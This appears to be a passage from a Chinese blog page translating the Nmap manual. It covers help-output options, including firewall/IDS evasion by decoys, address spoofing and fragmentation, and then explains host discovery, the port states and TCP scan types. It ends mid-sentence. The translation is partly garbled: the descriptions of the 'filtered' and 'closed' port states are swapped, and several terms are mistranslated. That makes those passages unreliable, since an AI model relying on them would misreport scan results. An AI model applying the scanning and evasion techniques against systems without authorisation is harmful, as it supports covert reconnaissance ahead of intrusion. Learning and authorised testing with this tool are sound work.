目录、脚本文件或脚本类别</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: 为脚本提供参数</span><br><span class="line">  --script-args-file=文件名：在文件中提供 NSE 脚本参数</span><br><span class="line">  --script-trace：显示发送和接收的所有数据</span><br><span class="line">  --script-updatedb：更新脚本数据库。</span><br><span class="line">  --script-help=&lt;Lua 脚本&gt;：显示有关脚本的帮助。</span><br><span class="line">           &lt;Lua scripts&gt; 是一个以逗号分隔的脚本文件列表或</span><br><span class="line">           脚本类别。</span><br><span class="line">操作系统检测：</span><br><span class="line">  -O：启用操作系统检测</span><br><span class="line">  --osscan-limit：将操作系统检测限制为有希望的目标</span><br><span class="line">  --osscan-guess：更积极地猜测操作系统</span><br><span class="line">时间安排和表演：</span><br><span class="line">  需要&lt;time&gt;的选项以秒为单位，或附加“ms”（毫秒），</span><br><span class="line">  将“s”（秒）、“m”（分钟）或“h”（小时）转换为值（例如 30m）。</span><br><span class="line">  -T&lt;0-5&gt;：设置计时模板（越高越快）</span><br><span class="line">  --min-hostgroup/max-hostgroup &lt;size&gt;：并行主机扫描组大小</span><br><span class="line">  --min-parallelism/max-parallelism &lt;numprobes&gt;：探测并行化</span><br><span class="line">  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;时间&gt;：指定</span><br><span class="line">      探头往返时间。</span><br><span class="line">  --max-retries &lt;tries&gt;：端口扫描探测重传次数的上限。</span><br><span class="line">  --host-timeout &lt;时间&gt;：经过这么长时间后放弃目标</span><br><span class="line">  --scan-delay/--max-scan-delay &lt;时间&gt;：调整探头之间的延迟</span><br><span class="line">  --min-rate &lt;number&gt;: 每秒发送数据包的速度不低于&lt;number&gt;</span><br><span class="line">  --max-rate &lt;number&gt;: 每秒发送数据包的速度不超过 &lt;number&gt;</span><br><span class="line">防火墙/IDS 规避和欺骗：</span><br><span class="line">  -F; --mtu &lt;val&gt;：片段数据包（可选地带有给定的 MTU）</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;：用诱饵隐藏扫描</span><br><span class="line">  -S &lt;IP_Address&gt;：欺骗源地址</span><br><span class="line">  -e &lt;iface&gt;：使用指定的接口</span><br><span class="line">  -g/--source-port &lt;portnum&gt;：使用给定的端口号</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: 通过 HTTP/SOCKS4 代理中继连接</span><br><span class="line">  --data &lt;十六进制字符串&gt;：将自定义负载附加到发送的数据包中</span><br><span class="line">  --data-string &lt;string&gt;：将自定义 ASCII 字符串附加到发送的数据包中</span><br><span class="line">  --data-length &lt;num&gt;：将随机数据附加到发送的数据包中</span><br><span class="line">  --ip-options &lt;options&gt;: 发送带有指定ip选项的数据包</span><br><span class="line">  --ttl &lt;val&gt;: 设置IP生存时间字段</span><br><span class="line">  --spoof-mac &lt;mac 地址/前缀/供应商名称&gt;: 欺骗您的 MAC 地址</span><br><span class="line">  --badsum：发送带有伪造 TCP/UDP/SCTP 校验和的数据包</span><br><span class="line">输出：</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;文件&gt;：以正常、XML、s|&lt;rIpt kIddi3 输出扫描，</span><br><span class="line">     和 Grepable 格式分别为给定的文件名。</span><br><span class="line">  -oA &lt;basename&gt;：同时以三种主要格式输出</span><br><span class="line">  -v：增加详细级别（使用-vv或更多以获得更好的效果）</span><br><span class="line">  -d：提高调试级别（使用-dd或更多以获得更好的效果）</span><br><span class="line">  --reason：显示端口处于特定状态的原因</span><br><span class="line">  --open：仅显示开放（或可能开放）的端口</span><br><span class="line">  --packet-trace：显示发送和接收的所有数据包</span><br><span class="line">  --iflist：打印主机接口和路由（用于调试）</span><br><span class="line">  --append-output：附加到而不是破坏指定的输出文件</span><br><span class="line">  --resume &lt;文件名&gt;：恢复中止的扫描</span><br><span class="line">  --noninteractive：通过键盘禁用运行时交互</span><br><span class="line">  --stylesheet &lt;path/URL&gt;：用于将 XML 输出转换为 HTML 的 XSL 样式表</span><br><span class="line">  --webxml：来自 Nmap.Org 的参考样式表，以获得更可移植的 XML</span><br><span class="line">  --no-stylesheet：防止 XSL 样式表与 XML 输出关联</span><br><span class="line">其他：</span><br><span class="line">  -6：启用 IPv6 扫描</span><br><span class="line">  -A：启用操作系统检测、版本检测、脚本扫描和traceroute</span><br><span class="line">  --datadir &lt;dirname&gt;: 指定自定义 Nmap 数据文件位置</span><br><span class="line">  --send-eth/--send-ip：使用原始以太网帧或 IP 数据包发送</span><br><span class="line">  --privileged：假设用户具有完全特权</span><br><span class="line">  --unprivileged：假设用户缺乏原始套接字权限</span><br><span class="line">  -V：打印版本号</span><br><span class="line">  -h：打印此帮助摘要页。</span><br></pre></td></tr></table></figure><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>主机发现可以将一组（有时是巨大的）IP 范围缩减为活动或感兴趣的主机列表。不同使用者会根据不同目的进行主机扫描，比如管理员可能仅使用 ICMP ping 来定位其内部网络上的主机，而外部渗透测试人员可能会使用数十个不同的探测器来尝试绕过防火墙的探测。</p><p>主机发现有时称为 ping 扫描，但它远远超出了与无处不在的ping工具相关的简单 ICMP 回显请求数据包。</p><p>用户可以通过列表扫描 ( <code>-sL</code>) 或禁用主机发现 (<code>-Pn</code> )来完全跳过发现步骤，或者使用多端口 TCP SYN&#x2F;ACK、UDP、SCTP INIT 和 ICMP 探测的任意组合来连接网络。这些探测的目标是请求响应，以证明 IP 地址实际上是活动的（正在被主机或网络设备使用）。</p><p>如果没有给出主机发现选项，Nmap 将发送 ICMP 回显请求、TCP SYN 数据包到端口 443、TCP ACK 数据包到端口 80 以及 ICMP 时间戳请求。</p><p>默认情况下，Nmap 进行主机发现，然后对其确定在线的每个主机执行端口扫描。如<code>-sn</code>仅执行主机发现，或用<code>-Pn</code>跳过主机发现并对所有目标地址进行端口扫描。</p><p><strong>以下选项控制主机发现：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL（列表扫描）</span><br></pre></td></tr></table></figure><p>列表扫描是主机发现的一种简并形式，它仅列出指定网络的每个主机，而不向目标主机发送任何数据包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sn（无端口扫描）</span><br></pre></td></tr></table></figure><p>该选项告诉 Nmap 在主机发现后不要进行端口扫描，而只打印出响应主机发现探测的可用主机。这通常称为ping 扫描，并且比 ping 广播地址更可靠，因为许多主机不会回复广播查询。默认情况下，这比列表扫描更具侵入性，并且通常可用于相同目的。对于攻击者来说，了解有多少主机处于运行状态比通过对每个 IP 和主机名进行列表扫描所提供的列表更有价值。</p><p>默认情况下，完成的默认主机发现<code>-sn</code>由 ICMP 回显请求、端口 443 的 TCP SYN、端口 80 的 TCP ACK 以及 ICMP 时间戳请求组成。当由非特权用户执行时，默认探测是使用<code>connect</code>系统调用发送到端口 80 和 443 的 SYN 数据包。当特权用户尝试扫描本地以太网上的目标时，除非 <code>--send-ip</code>指定，否则将使用 ARP 请求。该<code>-sn</code>选项可以与任何发现探测类型（<code>-P*</code>选项）组合以获得更大的灵活性。如果使用任何这些探测类型和端口号选项，则默认探测将被覆盖。</p><p>在 Nmap 的早期版本中，<code>-sn</code>被称为 <code>-sP</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pn（无 ping）</span><br></pre></td></tr></table></figure><p>此选项完全跳过主机发现阶段。通常，Nmap 使用此阶段来确定活动机器以进行较重的扫描并测量网络速度。默认情况下，Nmap 仅对发现已启动的主机执行大量探测，例如端口扫描、版本检测或操作系统检测。禁用主机发现会导致 Nmap 对每个主机尝试请求扫描功能。与列表扫描一样，会跳过正确的主机发现，但 Nmap 不会停止并打印目标列表，而是继续执行请求的功能，就好像每个目标 IP 都处于活动状态一样。</p><p>对于本地以太网上的机器，仍然会执行 ARP 扫描（除非指定<code>--disable-arp-ping</code>或<code>--send-ip</code>），因为 Nmap 需要 MAC 地址来进一步扫描目标主机。在 Nmap 的早期版本中，<code>-Pn</code>是 <code>-P0</code> 和 <code>-PN</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PS *&lt;port list&gt;*（TCP SYN Ping）</span><br></pre></td></tr></table></figure><p>此选项发送一个设置了 SYN 标志的空 TCP 数据包。默认目标端口为 80（可在编译时通过更改进行<code>DEFAULT_TCP_PROBE_PORT_SPEC</code> 配置<code>nmap.h</code>）。 可以将备用端口指定为参数。</p><p>SYN 标志向远程系统表明您正在尝试建立连接。通常目的端口将被关闭，并发回一个RST（重置）数据包。 如果端口恰好打开，目标将通过响应 SYN&#x2F;ACK TCP 数据包来执行 TCP 三向握手的第二步。然后，运行 Nmap 的机器通过 RST 响应来断开新生连接，而不是发送 ACK 数据包，后者将完成三次握手并建立完整连接。RST 数据包是由运行 Nmap 的机器的内核发送的，以响应意外的 SYN&#x2F;ACK，而不是由 Nmap 本身发送。</p><p>在 Unix 机器上，通常只有特权用户 <code>root</code> 才能发送和接收原始 TCP 数据包。 对于非特权用户，系统会自动采用一种解决方法 ，<code>connect</code>针对每个目标端口启动系统调用。这会向目标主机发送 SYN 数据包，以尝试建立连接。如果<code>connect</code>快速成功返回或 ECONNREFUSED 失败，则底层 TCP 堆栈必须已收到 SYN&#x2F;ACK 或 RST，并且主机被标记为可用。如果连接尝试一直挂起直到达到超时，则主机将被标记为关闭。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PA *&lt;port list&gt;*（TCP ACK Ping）</span><br></pre></td></tr></table></figure><p>TCP ACK ping 与刚才讨论的 SYN ping 非常相似。正如您可能猜到的那样，区别在于设置了 TCP ACK 标志而不是 SYN 标志。此类 ACK 数据包声称通过已建立的 TCP 连接确认数据，但此类连接并不存在。因此，远程主机应始终使用 RST 数据包进行响应，以公开其进程中的存在。</p><p>该<code>-PA</code>选项使用与 SYN 探测 (80) 相同的默认端口，并且还可以采用相同格式的目标端口列表。如果非特权用户尝试执行此操作， <code>connect</code>则会使用前面讨论的解决方法。此解决方法并不完美，因为<code>connect</code>实际上发送的是 SYN 数据包而不是 ACK。</p><p>同时提供 SYN 和 ACK ping 探测的原因是为了最大限度地提高绕过防火墙的机会。许多管理员配置路由器和其他简单的防火墙来阻止传入的 SYN 数据包，但那些发往公共服务（例如公司网站或邮件服务器）的数据包除外。这可以防止与组织的其他传入连接，同时允许用户与 Internet 建立畅通无阻的传出连接。这种无状态方法占用防火墙&#x2F;路由器上的资源很少，并且受到硬件和软件过滤器的广泛支持。Linux Netfilter&#x2F;iptables 防火墙软件提供了 <code>--syn</code>实现这种无状态方法的便捷选项。当诸如此类的无状态防火墙规则就位时，SYN ping 探测 ( <code>-PS</code>) 在发送到关闭的目标端口时可能会被阻止。<strong>在这种情况下，ACK 探测会大放异彩，因为它直接突破了这些规则。</strong></p><p>另一种常见类型的防火墙使用状态规则来丢弃意外的数据包。Linux Netfilter&#x2F;iptables 系统通过 <code>--state</code>选项支持这一点，该选项根据连接状态对数据包进行分类。SYN 探测更有可能对此类系统起作用，因为意外的 ACK 数据包通常会被识别为伪造的数据包并被丢弃。解决这个困境的一个解决方案是通过指定 <code>-PS</code>和来发送 SYN 和 ACK 探测<code>-PA</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PU *&lt;port list&gt;*（UDP 平）</span><br></pre></td></tr></table></figure><p>另一个主机发现选项是 UDP ping，它将 UDP 数据包发送到给定端口。对于大多数端口，数据包将为空，但有些端口使用更可能引发响应的特定于协议的有效负载。 有效负载与服务和版本检测中使用的探针相同，并在 <code>nmap-service-probes</code> 文件中定义。数据包内容也可能受到 <code>--data</code>、<code>--data-string</code>、 和 <code>--data-length</code>选项的影响。</p><p>端口列表采用与前面讨论的选项相同的 <code>-PS</code>格式<code>-PA</code>。如果未指定端口，则默认值为 40125。 </p><p>在到达目标计算机上的关闭端口后，UDP 探测应引出 ICMP 端口不可达数据包作为返回。这向 Nmap 表明该机器已启动且可用。许多其他类型的 ICMP 错误（例如主机&#x2F;网络无法访问或超出 TTL）都表明主机已关闭或无法访问。缺乏回应也可以这样解释。如果到达开放端口，大多数服务只会忽略空数据包并且无法返回任何响应。这就是为什么默认探测端口是 40125，该端口极不可能被使用。一些服务，例如字符生成器 (chargen) 协议，将响应空的 UDP 数据包，从而向 Nmap 透露该机器可用。</p><p>这种扫描类型的主要优点是它绕过仅屏蔽 TCP 的防火墙和过滤器。例如，我曾经拥有一台Linksys BEFW11S4无线宽带路由器。该设备的外部接口默认过滤所有 TCP 端口，<strong>但 UDP 探测仍然会引发端口不可达消息，从而泄露该设备。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PY *&lt;port list&gt;*（SCTP 初始化 Ping）</span><br></pre></td></tr></table></figure><p>此选项发送包含最小 INIT 块的 SCTP 数据包。默认目标端口为 80。可以将备用端口指定为参数。</p><p>例子： <code>-PY22</code>和 <code>-PY22,80,179,5060</code>。</p><p>在 Unix 机器上，通常只有特权用户 <code>root</code> 才能发送和接收原始 SCTP 数据包。 目前，非特权用户无法使用 SCTP INIT Ping。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PE; -PP; -PM（ICMP Ping 类型）</span><br></pre></td></tr></table></figure><p>除了前面讨论的不常见的 TCP、UDP 和 SCTP 主机发现类型之外，Nmap 还可以发送由无处不在的 ping程序发送的标准数据包。Nmap 向目标 IP 地址发送 ICMP 类型 8（回显请求）数据包，期望从可用主机返回类型 0（回显应答）。 不幸的是，对于网络浏览器来说，许多主机和防火墙现在会阻止这些数据包，而不是按照期望进行响应。 因此，针对 Internet 上的未知目标，仅 ICMP 扫描很少足够可靠。但对于监控内部网络的系统管理员来说，它们可能是一种实用且有效的方法。使用该<code>-PE</code>选项启用此回显请求行为。</p><p>虽然 echo 请求是标准的 ICMP ping 查询，但 Nmap 并不止于此。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PO *&lt;protocol list&gt;*（IP 协议 Ping）</span><br></pre></td></tr></table></figure><p>较新的主机发现选项之一是 IP 协议 ping，它发送 IP 数据包，并在其 IP 标头中设置指定的协议号。协议列表采用与前面讨论的 TCP、UDP 和 SCTP 主机发现选项中的端口列表相同的格式。</p><p>此主机发现方法查找使用与探测相同的协议的响应，或者查找表示目标主机不支持给定协议的 ICMP 协议不可达消息。无论哪种类型的响应都表明目标主机还活着。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--disable-arp-ping（无 ARP 或 ND Ping）</span><br></pre></td></tr></table></figure><p>Nmap 通常对本地连接的以太网主机进行 ARP 或 IPv6 邻居发现 (ND) 发现，即使使用其他主机发现选项（例如<code>-Pn</code>或 ） 。<code>-PE</code>要禁用此隐式行为，请使用该<code>--disable-arp-ping</code> 选项。</p><p>默认行为通常更快，但此选项在使用代理 ARP 的网络上很有用，在这种网络中，路由器会推测性地回复所有 ARP 请求，使每个目标根据 ARP 扫描看起来都已启动。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--discovery-ignore-rst</span><br></pre></td></tr></table></figure><p>在某些情况下，防火墙可能会欺骗 TCP 重置 (RST) 回复，以响应对未占用或不允许的地址的探测。由于 Nmap 通常认为 RST 回复是目标已启动的证据，这可能会导致浪费时间扫描不存在的目标。使用<code>--discovery-ignore-rst</code>将阻止 Nmap 在主机发现期间考虑这些回复。在这种情况下，您可能需要选择额外的主机发现选项以确保不会错过目标。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--traceroute（跟踪主机路径）</span><br></pre></td></tr></table></figure><p>扫描后使用扫描结果中的信息执行跟踪路由，以确定最有可能到达目标的端口和协议。它适用于除连接扫描 ( <code>-sT</code>) 和空闲扫描 ( <code>-sI</code>) 之外的所有扫描类型。所有跟踪均使用 Nmap 的动态时序模型并并行执行。</p><p>Traceroute 的工作原理是发送低 TTL（生存时间）数据包，尝试从扫描器和目标主机之间的中间跃点获取 ICMP 超时消息。标准跟踪路由实现从 TTL 1 开始，并递增 TTL，直到到达目标主机。Nmap 的跟踪路由以高 TTL 开始，然后递减 TTL 直到达到零。向后执行可以让 Nmap 采用巧妙的缓存算法来加速多个主机上的跟踪。根据网络状况，Nmap 平均每台主机发送的数据包数量减少 5-10 个。如果正在扫描单个子网（即 192.168.0.0&#x2F;24），Nmap 可能只需向大多数主机发送两个数据包。</p><h3 id="端口扫描基础知识"><a href="#端口扫描基础知识" class="headerlink" title="端口扫描基础知识"></a>端口扫描基础知识</h3><p>虽然 Nmap 的功能多年来不断发展，但它最初是一个高效的端口扫描器，并且这仍然是其核心功能。虽然许多端口扫描器传统上将所有端口集中到打开或关闭状态，但 Nmap 的粒度更加细化。它将端口分为六种状态：<code>open</code>、 <code>closed</code>、<code>filtered</code>、 <code>unfiltered</code>、 <code>open|filtered</code>、 或 <code>closed|filtered</code>。</p><p>这些状态不是端口本身的固有属性，而是描述 Nmap 如何看待它们。例如，来自与目标相同网络的 Nmap 扫描可能会显示端口<code>135/tcp</code>为开放状态，而同时使用相同选项来自 Internet 的扫描可能会将该端口显示为<code>filtered</code>。</p><p><strong>Nmap认可的六个端口状态：</strong></p><ul><li><p><code>open</code>打开</p><p><code>Open</code> 意味着目标计算机上的应用程序正在侦听该端口上的连接&#x2F;数据包。 </p><p>应用程序正在此端口上主动接受 TCP 连接、UDP 数据报或 SCTP 关联。找到这些通常是端口扫描的主要目标。开放端口对于非安全扫描也很有趣，因为它们显示可在网络上使用的服务。</p></li><li><p><code>filtered</code>关闭</p><p><code>Filtered</code> 表示防火墙、过滤器或其他网络障碍物阻塞了该端口，因此 Nmap 无法判断它是 <code>open</code>还是<code>closed</code>。</p><p>关闭的端口可以访问（它接收并响应 Nmap 探测数据包），但没有应用程序侦听该端口。它们有助于显示主机在 IP 地址上启动（主机发现或 ping 扫描），并作为操作系统检测的一部分。由于关闭的端口是可以访问的，因此可能值得稍后扫描，以防某些端口打开。</p></li><li><p><code>closed</code>过滤的</p><p>Nmap 无法确定端口是否打开，因为数据包过滤阻止其探测到达该端口。过滤可以来自专用防火墙设备、路由器规则或基于主机的防火墙软件。这些端口让攻击者感到沮丧，因为它们提供的信息很少。有时，它们会使用 ICMP 错误消息进行响应，例如类型 3 代码 13（目标无法到达：管理上禁止通信），但简单地丢弃探测而不响应的过滤器更为常见。这迫使 Nmap 重试几次，以防探测由于网络拥塞而不是过滤而被丢弃。这会大大减慢扫描速度。</p></li><li><p><code>unfiltered</code>未过滤的</p><p>未过滤状态意味着端口可以访问，但 Nmap 无法确定该端口是打开还是关闭。只有用于映射防火墙规则集的 ACK 扫描才会将端口分类为此状态。使用其他扫描类型（例如窗口扫描、SYN 扫描或 FIN 扫描）扫描未过滤的端口可能有助于确定端口是否打开。</p></li><li><p><code>open|filtered</code>打开|过滤</p><p>当 Nmap 无法确定端口是开放还是已过滤时，会将端口置于此状态。对于开放端口没有响应的扫描类型，会发生这种情况。缺乏响应还可能意味着数据包过滤器丢弃了探测或其引起的任何响应。所以Nmap不能确定端口是开放的还是被过滤的。UDP、IP 协议、FIN、NULL 和 Xmas 扫描以这种方式对端口进行分类。</p></li><li><p><code>closed|filtered</code>封闭|过滤</p><p>当 Nmap 无法确定端口是关闭还是被过滤时，使用此状态。它仅用于 IP ID 空闲扫描。</p></li></ul><h3 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h3><p>Nmap 的所有扫描结果都是基于目标计算机（或它们前面的防火墙）返回的数据包，这些数据包可能会误导 Nmap 的响应。</p><p> Nmap 支持的十几种端口扫描技术，其中UDP 扫描 ( <code>-sU</code>) 和任何一种 SCTP 扫描类型 ( <code>-sY</code>、<code>-sZ</code>) 可以与任何一种 TCP 扫描类型组合。默认情况下，Nmap 执行 SYN 扫描，但如果用户没有发送原始数据包的适当权限（需要 Unix 上的 root 访问权限），它会替代连接扫描。在本节列出的扫描中，非特权用户只能执行连接扫描和 FTP 反弹扫描。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sS（TCP SYN 扫描）</span><br></pre></td></tr></table></figure><p>SYN 扫描是默认且最流行的扫描选项，它可以快速执行，在不受限制性防火墙阻碍的快速网络上每秒扫描数千个端口。由于它从不完成 TCP 连接，因此它也相对不引人注目和隐蔽。SYN 扫描适用于任何兼容的 TCP 堆栈，而不是像 Nmap 的 FIN&#x2F;NULL&#x2F;Xmas、Maimon 和空闲扫描那样依赖于特定平台的特性。它还允许在<code>open</code>、 <code>closed</code>和<code>filtered</code> 状态之间进行清晰、可靠的区分。此技术通常称为<strong>半开扫描</strong>，因为您不会建立完整的 TCP 连接。</p><p>Nmap发送一个 SYN 数据包，表示想建立一个真正的连接，然后等待响应。SYN&#x2F;ACK 表示端口正在侦听（打开），而 RST（重置）则表示非侦听器。如果多次重传后仍未收到响应，则该端口被标记为已过滤。如果收到 ICMP 不可达错误，该端口也会标记为已过滤。如果收到 SYN 数据包（不带 ACK 标志）作为响应，则该端口也被视为打开。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT（TCP连接扫描）</span><br></pre></td></tr></table></figure><p>当 SYN 扫描不可用时，TCP 连接扫描是默认的 TCP 扫描类型。当用户没有原始数据包权限时就会出现这种情况。Nmap 不像大多数其他扫描类型那样写入原始数据包，而是通过发出系统调用来要求底层操作系统与目标计算机和端口建立连接<code>connect</code>。它是称为 Berkeley Sockets API 的编程接口的一部分。Nmap 使用此 API 来获取每次连接尝试的状态信息，而不是离线读取原始数据包响应。当 SYN 扫描可用时，它通常是更好的选择。Nmap对高层的控制较少<code>connect</code>与原始数据包相比，调用效率较低。</p><p><strong>系统调用完成与打开目标端口的连接，而不是执行 SYN 扫描所做的半打开重置。</strong>这不仅需要更长的时间并需要更多的数据包来获取相同的信息，而且目标计算机更有可能记录连接。一个像样的 IDS 可以捕获其中任何一个，但大多数机器没有这样的警报系统。当 Nmap 连接然后关闭连接而不发送数据时，普通 Unix 系统上的许多服务都会在 syslog 中添加一条注释，有时还会添加一条神秘的错误消息。如果管理员在日志中看到来自单个系统的大量连接尝试，则应该知道它已被连接扫描。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sU（UDP 扫描）</span><br></pre></td></tr></table></figure><p>虽然 Internet 上大多数流行的服务都运行在 TCP 协议上，但UDP服务也得到了广泛部署。DNS、SNMP 和 DHCP（注册端口 53、161&#x2F;162 和 67&#x2F;68）是最常见的三种。</p><p>使用该选项激活 UDP 扫描<code>-sU</code>，Nmap 可以帮助清点 UDP 端口。它可以与 TCP 扫描类型（例如 SYN 扫描 ( <code>-sS</code>)）结合使用，以在同一运行期间检查两种协议。</p><p><strong>UDP 扫描的工作原理是向每个目标端口发送 UDP 数据包。</strong><code>--data</code>对于某些常见端口（例如 53 和 161），会发送特定于协议的有效负载以提高响应速度，但对于大多数端口，除非指定 <code>--data-string</code>、 或<code>--data-length</code> 选项，否则数据包为空。如果返回 ICMP 端口不可达错误（类型 3，代码 3），则端口为<code>closed</code>。其他 ICMP 不可达错误将端口标记为<code>filtered</code>。有时，服务会用 UDP 数据包进行响应，证明它是<code>open</code>。如果重传后没有收到响应，则该端口被分类为<code>open|filtered</code>。这意味着端口可能是开放的，或者数据包过滤器可能正在阻止通信。版本检测（<code>-sV</code>）可用于帮助区分真正开放的端口和已过滤的端口。</p><p><strong>UDP 扫描的一大挑战是快速完成扫描。</strong>开放和过滤的端口很少发送任何响应，导致 Nmap 超时并重新传输，以防探测或响应丢失。关闭的端口通常是一个更大的问题。它们通常会发回 ICMP 端口不可达错误。但与关闭 TCP 端口发送的 RST 数据包响应 SYN 或连接扫描不同，许多主机 默认对 ICMP 端口不可达消息进行速率限制。Linux 和Solaris 对此特别严格。例如，Linux 2.4.20 内核将目标不可达消息限制为每秒一条（在 中<code>net/ipv4/icmp.c</code>）。Nmap 检测速率限制并相应减慢速度，以避免目标计算机丢弃的无用数据包淹没网络。不幸的是，Linux 风格的每秒一个数据包的限制使得 65,536 个端口扫描需要超过 18 个小时。</p><p>加快 UDP 扫描速度的想法包括并行扫描更多主机、首先快速扫描常用端口、从防火墙后面扫描以及用于<code>--host-timeout</code>跳过慢速主机。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sY（SCTP 初始化扫描）</span><br></pre></td></tr></table></figure><p>SCTP是 TCP 和 UDP 协议的相对较新的替代协议，结合了 TCP 和 UDP 的大部分特性，还添加了多宿主和多流等新功能。它主要用于 SS7&#x2F;SIGTRAN 相关服务，但也有可能用于其他应用程序。SCTP INIT 扫描相当于 TCP SYN 扫描的 SCTP。它可以快速执行，在不受限制性防火墙阻碍的快速网络上每秒扫描数千个端口。与 SYN 扫描一样，INIT 扫描相对不引人注目且隐蔽，因为它从不完成 SCTP 关联。它还允许在<code>open</code>、 <code>closed</code>和<code>filtered</code> 状态之间进行清晰、可靠的区分。<strong>此技术通常称为半开放扫描，因为您没有打开完整的 SCTP 关联。</strong>Nmap发送一个 INIT 块，就好像要打开一个真正的关联，然后等待响应。INIT-ACK 块指示端口正在侦听（打开），而 ABORT 块指示非侦听器。如果多次重传后仍未收到响应，则该端口被标记为已过滤。如果收到 ICMP 不可达错误，该端口也会标记为已过滤。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sN; -sF; -sX（TCP NULL、FIN 和 Xmas 扫描）</span><br></pre></td></tr></table></figure><p><code>--scanflags</code>这三种扫描类型利用TCP REC中的微妙漏洞来区分<code>open</code>和 <code>closed</code>端口。</p><p>RFC 793 第 65 页指出“如果 [目标] 端口状态为 CLOSED …. 不包含 RST 的传入数据段会导致发送 RST 作为响应。” 然后下一页讨论发送到未设置 SYN、RST 或 ACK 位的开放端口的数据包，指出：“您不太可能到达这里，但如果到达，则丢弃该段并返回。”<strong>当扫描符合此 RFC 文本的系统时，如果端口关闭，则任何不包含 SYN、RST 或 ACK 位的数据包都将导致返回 RST；如果端口打开，则根本不会响应。</strong>只要不包含这三个位，其他三个位（FIN、PSH 和 URG）的任意组合都可以。</p><p>Nmap 通过三种扫描类型利用这一点：空扫描 ( <code>-sN</code>)不设置任何位（TCP 标志标头为 0）FIN 扫描 ( <code>-sF</code>)仅设置 TCP FIN 位。圣诞扫描 ( <code>-sX</code>)设置 FIN、PSH 和 URG 标志，像圣诞树一样点亮数据包。除了探测数据包中设置的 TCP 标志之外，这三种扫描类型的行为完全相同。**如果收到RST包，则认为该端口是<code>closed</code>，没有响应则认为是<code>open|filtered</code>**。<code>filtered</code>如果收到 ICMP 不可达错误，则会标记端口 。</p><p><strong>优点：</strong></p><ul><li><p>可以潜入某些非状态防火墙和数据包过滤路由器。</p></li><li><p>这些扫描类型比 SYN 扫描更加隐秘</p></li></ul><p><strong>缺点：</strong></p><ul><li>它们无法区分<code>open</code>端口和某些端口<code>filtered</code>，只会留下答复 <code>open|filtered</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sA（TCP ACK 扫描）</span><br></pre></td></tr></table></figure><p>此扫描与迄今为止讨论的其他扫描不同，因为它从不确定<code>open</code>（甚至 <code>open|filtered</code>）端口。它用于映射防火墙规则集，确定它们是否有状态以及过滤哪些端口。ACK 扫描探测数据包仅设置了 ACK 标志（除非您使用<code>--scanflags</code>）。当扫描未过滤的系统时， <code>open</code>端口<code>closed</code>都会返回 RST 数据包。然后，Nmap 将它们标记为 <code>unfiltered</code>，这意味着 ACK 数据包可以到达它们，但它们是否是<code>open</code>或 <code>closed</code>尚未确定。不响应或发回某些 ICMP 错误消息的端口标记为<code>filtered</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sW（TCP窗口扫描）</span><br></pre></td></tr></table></figure><p>窗口扫描与 ACK 扫描完全相同，只是它利用某些系统的实现细节来区分开放端口和关闭端口，而不是总是 <code>unfiltered</code>在返回 RST 时进行打印。它通过检查返回的 RST 数据包的 TCP 窗口字段来实现此目的。在某些系统上，开放端口使用正窗口大小（即使对于 RST 数据包），而关闭端口则使用零窗口。因此，窗口扫描不是总是<code>unfiltered</code>在收到 RST 返回时列出端口，<code>open</code>而是 <code>closed</code>在重置中的 TCP 窗口值分别为正或零时列出端口。此扫描依赖于互联网上少数系统的实现细节，因此您不能总是信任它。不支持它的系统通常会返回所有端口 <code>closed</code>。当然，也有可能机器确实没有开放端口。如果大多数扫描到的端口 <code>closed</code>只有少数常见端口号（例如 22、25、53）<code>filtered</code>，则系统很可能容易受到影响。有时，系统甚至会表现出完全相反的行为。如果您的扫描显示 1,000 个开放端口和 3 个关闭或过滤的端口，那么这三个端口很可能是真正开放的端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sM（TCP迈蒙扫描）</span><br></pre></td></tr></table></figure><p>迈蒙扫描以其发现者尤里尔·迈蒙 (Uriel Maimon) 的名字命名。该技术与 NULL、FIN 和 Xmas 扫描完全相同，只不过探测的是 FIN&#x2F;ACK。根据RFC 793 (TCP)，无论端口是打开还是关闭，都应该生成 RST 数据包来响应此类探测。然而，Uriel 注意到，如果端口打开，许多 BSD 派生系统就会简单地丢弃数据包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--scanflags（自定义 TCP 扫描）</span><br></pre></td></tr></table></figure><p>真正高级的 Nmap 用户不需要将自己限制于所提供的预设扫描类型。该<code>--scanflags</code>选项允许您通过指定任意 TCP 标志来设计自己的扫描。 参数<code>--scanflags</code>可以是数字标志值，例如 9（PSH 和 FIN），但使用符号名称更容易。<code>URG</code>只需将、 <code>ACK</code>、<code>PSH</code>、 <code>RST</code>、<code>SYN</code>和 的任意组合混在一起即可 <code>FIN</code>。</p><p>例如，<code>--scanflags 